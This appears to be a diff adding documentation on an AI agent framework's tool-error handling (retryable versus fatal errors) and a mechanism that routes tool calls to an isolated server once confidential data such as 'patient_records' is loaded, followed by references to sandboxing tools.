+The `search_records` tool checks for empty queries and raises `ToolRetryError("Query cannot be empty -- provide a search term")`. FastMCP converts this to a `ToolError`, which PydanticAI surfaces as a `ModelRetry`. The LLM receives the error message and gets another chance to provide valid arguments. With `verbose=True`, the step-by-step log shows the retry followed by a second tool call with a non-empty query.
+
+This is the distinction between `ToolRetryError` and `ToolFatalError`. A retryable error means the tool's logic is fine but the arguments were wrong -- the LLM should try again. A fatal error means something is broken at the infrastructure level and the agent run should abort immediately. `MCPServerStrict` intercepts fatal errors (identified by the `[FATAL]` prefix) and raises `RuntimeError` instead of `ModelRetry`.
+
+### Private Data and Isolation Switch
+
+The third interaction loads a sensitive dataset:
+
+```python
+print(f"Private data   : {session_has_private_data()}")
+print(f"Isolated before: {getattr(server, 'is_isolated', 'N/A')}")
+
+async with agent:
+    result, _ = await run_agent(agent, "Load the 'patient_records' sensitive dataset")
+```
+
+Inside `load_sensitive_dataset`, the tool calls `PrivateData().add_private_dataset("patient_records", DataSensitivity.CONFIDENTIAL)`. This writes a `.private_data` JSON file outside the agent's workspace (so the agent cannot tamper with it) and sets the session's sensitivity level to CONFIDENTIAL.
+
+After the agent run completes, inspecting the client state reveals the switch:
+
+```python
+print(f"Private data  : {session_has_private_data()}")   # True
+print(f"Isolated after: {getattr(server, 'is_isolated', 'N/A')}")  # True
+```
+
+The `is_isolated` property flipped from `False` to `True`. From this point on, every `list_tools`, `call_tool`, and `direct_call_tool` invocation on the `MCPServerPrivateData` object routes to the isolated instance on port 8001 instead of the normal instance on port 8000.
+
+
+
+## References
+
+## References
+
+[Bubblewrap](https://github.com/containers/bubblewrap) -- Unprivileged sandboxing tool using Linux user namespaces. Used for lightweight process, filesystem, and network isolation without requiring root or a container runtime.
+
+[Docker](https://docs.docker.com/) -- Container platform providing heavyweight process isolation with cgroup resource limits, full network namespace control, and image-based reproducibility. Used for production multi-tenant sandboxes and MCP server isolation.
+
+[Envoy Proxy](https://www.envoyproxy.io/) -- High-performance edge/service proxy. Discussed as a design pattern for proxy-based selective network connectivity in sandbox environments handling confidential data.
+
+[Project Jupyter](https://jupyter.org/) -- Open-source interactive computing platform. The notebook and cell model used in the REPL section borrows its metaphor and conventions (shared namespace, last-expression capture, `.ipynb` export).
 
 
 \newpage
